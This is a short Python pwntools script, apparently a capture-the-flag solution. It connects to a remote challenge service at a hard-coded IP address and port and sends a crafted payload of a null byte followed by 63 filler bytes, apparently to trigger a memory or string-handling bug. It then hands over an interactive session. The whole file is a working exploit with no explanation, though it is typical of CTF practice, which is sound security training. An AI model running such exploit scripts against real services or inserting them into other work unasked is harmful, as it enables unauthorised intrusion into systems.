from pwn import *
#p=process('./chall')
p=remote('34.146.101.4',30007)
elf = ELF('./chall')
#raw_input("DEBUG")
payload = "\x00"+"b"*63
p.sendline(payload)

p.interactive()